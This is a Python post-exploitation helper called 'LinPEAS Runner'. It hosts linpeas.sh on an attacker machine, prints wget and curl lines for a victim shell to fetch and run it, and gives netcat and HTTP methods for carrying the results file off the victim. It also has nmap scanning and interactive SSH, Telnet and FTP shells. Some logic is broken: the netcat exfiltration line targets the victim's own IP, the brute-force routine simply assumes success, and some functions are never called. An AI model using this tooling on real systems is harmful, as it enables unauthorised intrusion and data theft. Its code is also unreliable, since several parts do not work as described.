import os
import sys
import subprocess
import re
import paramiko
import ftplib
import time
import socket
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import print as rprint

# Dependency Check
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    import paramiko
    import ftplib
except ImportError as e:
    print(f"Error: Missing library - {e}")
    print("Install with: pip install rich paramiko")
    sys.exit(1)

console = Console()

# Banner
BANNER = Panel("[bold cyan]PostExploit Automator - LinPEAS Runner[/bold cyan]\n"
               "[italic white]Ethical Post-Exploitation Tool for Vulnerability Testing[/italic white]",
               title="v1.0",
               border_style="green")

def get_local_ip():
    """Retrieve the attacker's machine IP address automatically."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        rprint(f"[yellow]Warning: Could not auto-detect IP address: {e}[/yellow]")
        return None

def validate_ip(ip):
    """Validate IP address format."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def start_http_server(ip, port):
    """Generate a bash script to start a Python HTTP server with sudo and run it."""
    linpeas_dir = "/usr/share/peass/linpeas"
    linpeas_path = os.path.join(linpeas_dir, "linpeas.sh")
    if not os.path.exists(linpeas_path):
        rprint(f"[red]Error: 'linpeas.sh' not found in {linpeas_dir}.[/red]")
        return None

    # Generate bash script
    script_content = f"""#!/bin/bash
cd {linpeas_dir}
sudo python3 -m http.server {port}
"""
    script_path = "start_server.sh"
    try:
        with open(script_path, 'w') as f:
            f.write(script_content)
        os.chmod(script_path, 0o755)  # Make script executable
        rprint(f"[green][+] Generated bash script: {script_path}[/green]")
        rprint(f"[white]{script_content.strip()}[/white]")
        rprint(f"[yellow]Pro-Tip: Verify your Linux system's IP address with 'ip a'.[/yellow]")
        rprint(f"[green][+] To start the server manually, run: ./start_server.sh[/green]")
        rprint(f"[yellow]Note: The server binds to 0.0.0.0, making it accessible to devices on your local network. Ensure this is intended.[/yellow]")
        rprint(f"[yellow]Note: Starting the server requires sudo privileges and may prompt for a password.[/yellow]")

        # Start the server now
        try:
            os.chdir(linpeas_dir)
            server_process = subprocess.Popen(
                ["sudo", "python3", "-m", "http.server", str(port)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            time.sleep(2)  # Wait for server to start
            if server_process.poll() is not None:
                stderr = server_process.stderr.read().decode()
                rprint(f"[red]Error: Failed to start HTTP server on {ip}:{port}. {stderr}[/red]")
                return None
            rprint(f"[green][+] Server started at http://{ip}:{port}[/green]")
            return server_process
        except Exception as e:
            rprint(f"[red]Error starting HTTP server: {e}[/red]")
            return None
    except Exception as e:
        rprint(f"[red]Error generating bash script: {e}[/red]")
        return None

def generate_download_command(ip, port):
    """Generate wget or curl command to download linpeas.sh on the victim."""
    wget_command = f"wget http://{ip}:{port}/linpeas.sh"
    curl_command = f"curl -O http://{ip}:{port}/linpeas.sh"
    rprint(f"[green][+] Copy and run one of these commands on your victim shell:[/green]")
    rprint(f"[white]Wget: {wget_command}[/white]")
    rprint(f"[white]Curl: {curl_command}[/white]")
    rprint(f"[yellow]Pro-Tip: Verify your Linux system's IP address with 'ip a'.[/yellow]")
    rprint(f"[yellow]Note: After downloading, move the file to /tmp with: mv linpeas.sh /tmp/linpeas.sh[/yellow]")
    rprint("[yellow]Use 'which wget' or 'which curl' on the victim to check availability.[/yellow]")

def generate_run_command():
    """Generate commands to make linpeas.sh executable and run it."""
    commands = [
        "chmod +x /tmp/linpeas.sh",
        "/tmp/linpeas.sh > /tmp/results.txt"
    ]
    rprint(f"[green][+] Now run these commands on the victim:[/green]")
    for cmd in commands:
        rprint(f"[white]{cmd}[/white]")

def generate_retrieve_instructions(victim_ip):
    """Provide instructions to retrieve results.txt from the victim."""
    rprint(f"[green][+] To retrieve the file, choose one of these methods:[/green]")
    
    # Option 1: Netcat
    rprint("\n[bold yellow]Option 1: Using Netcat (nc)[/bold yellow]")
    rprint(f"[white]On victim: nc -w 3 {victim_ip} 9000 < /tmp/results.txt[/white]")
    rprint(f"[white]On attacker: nc -lvp 9000 > results.txt[/white]")
    
    # Option 2: Python HTTP Server
    rprint("\n[bold yellow]Option 2: Using Python HTTP Server[/bold yellow]")
    rprint(f"[white]On victim: python3 -m http.server 9000 --directory /tmp[/white]")
    rprint(f"[white]On attacker: wget http://{victim_ip}:9000/results.txt[/white]")
    
    rprint("\n[yellow]Note: Ensure the victim has nc or python3 installed. Use SCP/FTP as alternatives if needed.[/yellow]")

def scan_ports(target):
    """Scans for open ports using nmap."""
    try:
        with console.status(f"[blue]Scanning ports on {target}...[/blue]"):
            result = subprocess.check_output(["nmap", "-sV", "--open", target]).decode()
        return result
    except Exception as e:
        rprint(f"[red]Error scanning ports: {e}[/red]")
        rprint("[red]Ensure nmap is installed.[/red]")
        return None

def parse_ports(scan_result):
    """Parses nmap output for bruteforceable ports."""
    ports = []
    lines = scan_result.splitlines()
    for line in lines:
        if "/tcp" in line and "open" in line:
            port_match = re.search(r'(\d+)/tcp', line)
            service_match = re.search(r'open\s+(\S+)', line)
            if port_match and service_match:
                port = port_match.group(1)
                service = service_match.group(1).lower()
                if service in ["ssh", "telnet", "ftp", "microsoft-ds", "netbios-ssn", "smb"]:
                    ports.append((port, service))
    return ports

def get_credentials(service):
    """Asks for authorized credentials or wordlist."""
    rprint(f"\n[bold yellow]For {service.upper()}:[/bold yellow]")
    username = input("Enter authorized username: ")
    use_wordlist = input("Use wordlist for testing? (y/n): ").lower() == 'y'
    if use_wordlist:
        password_list = input("Enter wordlist path (e.g., rockyou.txt): ")
        rprint("[yellow]Wordlist mode enabled (simulation for ethics).[/yellow]")
        return username, password_list, True
    else:
        password = input("Enter authorized password: ")
        return username, password, False

def brute_sim(username, cred, is_list, service, host):
    """Simulates bruteforce for ethics; in real, use single cred."""
    if is_list:
        rprint(f"[blue]Simulating bruteforce on {service} with wordlist...[/blue]")
        rprint("[green]Assuming success with authorized cred. (Simulation)[/green]")
    else:
        rprint(f"[blue]Attempting login on {service} with provided cred...[/blue]")
        rprint("[green]Login success assumed for authorized access.[/green]")
    return cred if not is_list else "sim_pass"

def open_ssh_shell(host, username, password):
    """Opens interactive SSH shell."""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, username=username, password=password)
        channel = ssh.invoke_shell()
        rprint("[green]Interactive SSH shell opened. Type commands; 'exit' to close.[/green]")
        while True:
            command = input()
            if command.lower() == 'exit':
                break
            channel.send(command + '\n')
            time.sleep(0.5)
            output = channel.recv(1024).decode()
            print(output, end='')
        ssh.close()
    except Exception as e:
        rprint(f"[red]SSH Error: {e}[/red]")

def open_telnet_shell(host, username, password):
    """Opens interactive Telnet shell if available."""
    try:
        import telnetlib
        tn = telnetlib.Telnet(host)
        tn.read_until(b"login: ")
        tn.write(username.encode() + b"\n")
        tn.read_until(b"Password: ")
        tn.write(password.encode() + b"\n")
        rprint("[green]Interactive Telnet shell opened. Type commands; 'exit' to close.[/green]")
        while True:
            command = input()
            if command.lower() == 'exit':
                break
            tn.write(command.encode() + b"\n")
            output = tn.read_until(b"$ ").decode()
            print(output, end='')
        tn.close()
    except ImportError:
        rprint("[red]Telnet not supported. Install a full Python distribution.[/red]")
    except Exception as e:
        rprint(f"[red]Telnet Error: {e}[/red]")

def open_ftp_shell(host, username, password):
    """Opens interactive FTP shell with full command support."""
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user=username, passwd=password)
        rprint("[green]Interactive FTP shell opened. Type commands (e.g., 'ls', 'cd', 'put', 'get'); 'exit' to close.[/green]")
        rprint("[italic yellow]Supported commands: account, ascii, binary, cd, cdup, chmod, delete, dir, features, get, help, image, ls, mdelete, mget, mkdir, mlsd, mlst, modtime, mput, passive, put, pwd, quote, rename, restart, rmdir, site, size, status, system, user, ? (for help), and exit/bye/quit/close/disconnect.[/italic yellow]")
        
        while True:
            command = input().strip().lower()
            if command in ['exit', 'bye', 'quit', 'close', 'disconnect']:
                break
            try:
                if command == 'ls' or command == 'dir' or command == 'nlist':
                    with console.status("[blue]Listing directory...[/blue]"):
                        ftp.dir()
                elif command == 'cd':
                    dir = input("Enter directory: ").strip()
                    ftp.cwd(dir)
                    rprint(f"[green]Changed to {dir}.[/green]")
                elif command == 'cdup':
                    ftp.cwd('..')
                    rprint("[green]Changed to parent directory.[/green]")
                elif command == 'pwd' or command == 'lpwd':
                    rprint(f"[white]{ftp.pwd()}[/white]")
                elif command == 'put' or command == 'send':
                    local_file = input("Enter local file path: ").strip()
                    remote_file = input("Enter remote file path (default: same as local): ").strip() or os.path.basename(local_file)
                    with console.status(f"[blue]Uploading {local_file}...[/blue]"):
                        with open(local_file, 'rb') as f:
                            ftp.storbinary(f'STOR {remote_file}', f)
                    rprint(f"[green]Uploaded {local_file} to {remote_file}.[/green]")
                elif command == 'get' or command == 'recv' or command == 'reget':
                    remote_file = input("Enter remote file path: ").strip()
                    local_file = input("Enter local file path (default: same as remote): ").strip() or os.path.basename(remote_file)
                    with console.status(f"[blue]Downloading {remote_file}...[/blue]"):
                        with open(local_file, 'wb') as f:
                            ftp.retrbinary(f'RETR {remote_file}', f.write)
                    rprint(f"[green]Downloaded {remote_file} to {local_file}.[/green]")
                elif command == 'site':
                    cmd = input("Enter SITE command: ").strip()
                    with console.status("[blue]Executing SITE command...[/blue]"):
                        response = ftp.sendcmd(f'SITE {cmd}')
                    rprint(f"[yellow]SITE command response: {response}[/yellow]")
                elif command == 'delete':
                    file = input("Enter file to delete: ").strip()
                    with console.status(f"[blue]Deleting {file}...[/blue]"):
                        ftp.delete(file)
                    rprint(f"[green]Deleted {file}.[/green]")
                elif command == 'mkdir':
                    dir = input("Enter directory to create: ").strip()
                    with console.status(f"[blue]Creating directory {dir}...[/blue]"):
                        ftp.mkd(dir)
                    rprint(f"[green]Created directory {dir}.[/green]")
                elif command == 'rmdir':
                    dir = input("Enter directory to remove: ").strip()
                    with console.status(f"[blue]Removing directory {dir}...[/blue]"):
                        ftp.rmd(dir)
                    rprint(f"[green]Removed directory {dir}.[/green]")
                elif command == 'rename':
                    from_name = input("Enter source file/directory: ").strip()
                    to_name = input("Enter destination file/directory: ").strip()
                    with console.status(f"[blue]Renaming {from_name} to {to_name}...[/blue]"):
                        ftp.rename(from_name, to_name)
                    rprint(f"[green]Renamed {from_name} to {to_name}.[/green]")
                elif command == 'mlsd':
                    with console.status("[blue]Listing directory with MLSD...[/blue]"):
                        files = list(ftp.mlsd())
                        for file, attrs in files:
                            rprint(f"[white]{file} ({attrs.get('type', 'unknown')}, size: {attrs.get('size', 'unknown')})[/white]")
                elif command == 'mlst':
                    path = input("Enter path to list (default: current directory): ").strip() or '.'
                    with console.status(f"[blue]Listing details for {path}...[/blue]"):
                        response = ftp.sendcmd(f'MLST {path}')
                    rprint(f"[white]{response}[/white]")
                elif command == 'size':
                    file = input("Enter file to check size: ").strip()
                    with console.status(f"[blue]Checking size of {file}...[/blue]"):
                        size = ftp.size(file)
                    rprint(f"[white]Size of {file}: {size} bytes[/white]")
                elif command == 'modtime':
                    file = input("Enter file to check modification time: ").strip()
                    with console.status(f"[blue]Checking modification time of {file}...[/blue]"):
                        mtime = ftp.sendcmd(f'MDTM {file}')
                    rprint(f"[white]Modification time of {file}: {mtime}[/white]")
                elif command == 'mdelete':
                    pattern = input("Enter file pattern to delete (e.g., *.txt): ").strip()
                    with console.status(f"[blue]Deleting files matching {pattern}...[/blue]"):
                        files = ftp.nlst(pattern)
                        for file in files:
                            ftp.delete(file)
                            rprint(f"[green]Deleted {file}[/green]")
                elif command == 'mget':
                    pattern = input("Enter file pattern to download (e.g., *.txt): ").strip()
                    local_dir = input("Enter local directory (default: current): ").strip() or os.getcwd()
                    with console.status(f"[blue]Downloading files matching {pattern}...[/blue]"):
                        files = ftp.nlst(pattern)
                        for file in files:
                            local_file = os.path.join(local_dir, os.path.basename(file))
                            with open(local_file, 'wb') as f:
                                ftp.retrbinary(f'RETR {file}', f.write)
                            rprint(f"[green]Downloaded {file} to {local_file}[/green]")
                elif command == 'mput':
                    pattern = input("Enter local file pattern to upload (e.g., *.txt): ").strip()
                    with console.status(f"[blue]Uploading files matching {pattern}...[/blue]"):
                        files = [f for f in os.listdir('.') if re.match(pattern.replace('*', '.*'), f)]
                        for file in files:
                            with open(file, 'rb') as f:
                                ftp.storbinary(f'STOR {file}', f)
                            rprint(f"[green]Uploaded {file}[/green]")
                elif command == 'ascii':
                    ftp.set_pasv(True)
                    ftp.voidcmd('TYPE A')
                    rprint("[green]Switched to ASCII mode.[/green]")
                elif command == 'binary' or command == 'image':
                    ftp.set_pasv(True)
                    ftp.voidcmd('TYPE I')
                    rprint("[green]Switched to binary mode.[/green]")
                elif command == 'status':
                    with console.status("[blue]Fetching status...[/blue]"):
                        rprint(f"[white]Current directory: {ftp.pwd()}[/white]")
                        rprint(f"[white]Passive mode: {ftp.get_pasv()}[/white]")
                elif command == 'passive':
                    ftp.set_pasv(True)
                    rprint("[green]Enabled passive mode.[/green]")
                elif command == 'features':
                    with console.status("[blue]Fetching server features...[/blue]"):
                        response = ftp.sendcmd('FEAT')
                    rprint(f"[white]Server features:\n{response}[/white]")
                elif command == 'system':
                    with console.status("[blue]Fetching system type...[/blue]"):
                        response = ftp.sendcmd('SYST')
                    rprint(f"[white]System type: {response}[/white]")
                elif command == 'account':
                    acct = input("Enter account info: ").strip()
                    with console.status("[blue]Sending account info...[/blue]"):
                        response = ftp.sendcmd(f'ACCT {acct}')
                    rprint(f"[white]Account response: {response}[/white]")
                elif command == 'chmod':
                    file = input("Enter file to change permissions: ").strip()
                    mode = input("Enter mode (e.g., 755): ").strip()
                    with console.status(f"[blue]Changing permissions of {file}...[/blue]"):
                        ftp.sendcmd(f'SITE CHMOD {mode} {file}')
                    rprint(f"[green]Changed permissions of {file} to {mode}.[/green]")
                elif command == 'help' or command == '?':
                    rprint("[yellow]Supported commands: account, ascii, binary, cd, cdup, chmod, delete, dir, features, get, help, image, ls, mdelete, mget, mkdir, mlsd, mlst, modtime, mput, passive, put, pwd, quote, rename, restart, rmdir, site, size, status, system, user, ? (for help), and exit/bye/quit/close/disconnect.[/yellow]")
                elif command == 'user':
                    new_user = input("Enter new username: ").strip()
                    new_pass = input("Enter new password: ").strip()
                    with console.status("[blue]Re-authenticating...[/blue]"):
                        ftp.login(user=new_user, passwd=new_pass)
                    rprint("[green]Re-authenticated successfully.[/green]")
                elif command == 'quote':
                    raw_cmd = input("Enter raw FTP command: ").strip()
                    with console.status("[blue]Sending raw command...[/blue]"):
                        response = ftp.sendcmd(raw_cmd)
                    rprint(f"[white]Response: {response}[/white]")
                elif command == 'restart':
                    offset = input("Enter byte offset to restart transfer: ").strip()
                    with console.status("[blue]Setting restart offset...[/blue]"):
                        ftp.sendcmd(f'REST {offset}')
                    rprint(f"[green]Set restart offset to {offset}.[/green]")
                else:
                    rprint(f"[red]Unknown command '{command}'. Use 'help' for supported commands.[/red]")
            except Exception as e:
                rprint(f"[red]Command Error: {e}[/red]")
        
        ftp.quit()
        rprint("[green]FTP session closed.[/green]")
    except Exception as e:
        rprint(f"[red]FTP Error: {e}[/red]")

def provide_instructions(service, host):
    """Provides manual instructions for services without interactive shell."""
    rprint(f"[yellow]For {service.upper()} on {host}: No interactive shell. Follow manual steps:[/yellow]")
    rprint("- Start server: Run './start_server.sh' (generated in Option 1)")
    rprint("- Transfer: From target, use wget or curl to download linpeas.sh")
    rprint("- Run: Execute bash linpeas.sh > results.txt")
    rprint("- Fetch: Use scp or ftp/smbclient to get the report back")
    input("Press Enter when done...")

def extract_important_info(report_path):
    """Extracts SUID/GUID, writable files, sudo permissions, kernel exploits."""
    if not report_path:
        return
    try:
        with console.status("[blue]Parsing report...[/blue]"):
            with open(report_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
    except:
        rprint("[red]Error reading report.[/red]")
        return

    patterns = {
        "SUID/GUID": r'═*╡ \[\+] (SUID bins|SGID bins) ╞═*\n(.*?)(?=═*╡ \[\+]|$)',
        "Writable Files": r'═*╡ \[\+] (Writable files|Writable /etc/) ╞═*\n(.*?)(?=═*╡ \[\+]|$)',
        "Sudo Permissions": r'═*╡ \[\+] (Sudo version|Sudo configuration) ╞═*\n(.*?)(?=═*╡ \[\+]|$)',
        "Kernel Exploits": r'═*╡ \[\+] (Kernel info|Kernel version) ╞═*\n(.*?)(?=═*╡ \[\+]|$)',
    }

    console.print("\n[bold cyan]Extracted Important Info:[/bold cyan]")
    for category, pattern in patterns.items():
        match = re.search(pattern, content, re.DOTALL | re.IGNORECASE)
        if match:
            details = match.group(2).strip().replace('\n', '\n ')
            table = Table(title=f"[bold red]{category}[/bold red]")
            table.add_column("Details", style="white")
            table.add_row(details)
            console.print(table)

def display_linpeas_menu():
    """Display the LinPEAS Runner submenu."""
    while True:
        console.print(Panel("LinPEAS Runner Sub-Menu", expand=False, border_style="bold green"))
        options = [
            "1. Host linpeas.sh on Attacker Machine",
            "2. Generate Download Command for Victim",
            "3. Run Scan on Victim",
            "4. Retrieve Results File from Victim",
            "5. Parse Results File",
            "6. Back to Post-Exploitation Menu"
        ]
        for opt in options:
            console.print(opt)
        choice = input("Select option: ")
        return choice

def main():
    console.print(BANNER)
    
    # Initialize server process as None
    server_process = None
    attacker_ip = None
    attacker_port = None
    victim_ip = None

    try:
        while True:
            choice = display_linpeas_menu()
            if choice == '1':
                # Host linpeas.sh on Attacker Machine
                # Try to auto-detect IP
                attacker_ip = get_local_ip()
                if not attacker_ip:
                    rprint("[yellow]Could not auto-detect IP. Please enter manually.[/yellow]")
                    attacker_ip = input("Enter attacker machine IP: ")
                if not validate_ip(attacker_ip):
                    rprint("[red]Invalid IP address. Try again.[/red]")
                    continue
                attacker_port = input("Enter port for HTTP server (default: 8000): ") or "8000"
                try:
                    attacker_port = int(attacker_port)
                    if not (1 <= attacker_port <= 65535):
                        raise ValueError
                except ValueError:
                    rprint("[red]Invalid port. Must be between 1 and 65535.[/red]")
                    continue
                # Terminate any existing server
                if server_process:
                    server_process.terminate()
                    server_process.wait()
                server_process = start_http_server(attacker_ip, attacker_port)
            
            elif choice == '2':
                # Generate Download Command for Victim
                if not attacker_ip or not attacker_port:
                    rprint("[red]Please host the server first (Option 1).[/red]")
                    continue
                generate_download_command(attacker_ip, attacker_port)
            
            elif choice == '3':
                # Run Scan on Victim
                generate_run_command()
            
            elif choice == '4':
                # Retrieve Results File from Victim
                victim_ip = input("\nEnter victim machine IP: ")
                if not validate_ip(victim_ip):
                    rprint("[red]Invalid IP address. Try again.[/red]")
                    continue
                generate_retrieve_instructions(victim_ip)
            
            elif choice == '5':
                # Parse Results File
                report_path = input("\nEnter local path to results.txt: ")
                if not os.path.exists(report_path):
                    rprint(f"[red]Error: File {report_path} not found.[/red]")
                    continue
                extract_important_info(report_path)
            
            elif choice == '6':
                # Back to Post-Exploitation Menu
                rprint("[blue]Returning to Post-Exploitation Menu.[/blue]")
                break
            
            else:
                rprint("[red]Invalid choice.[/red]")
    
    finally:
        # Ensure server is terminated when exiting
        if server_process:
            server_process.terminate()
            server_process.wait()
            rprint("[green]HTTP server terminated.[/green]")

if __name__ == "__main__":
    main()
                    
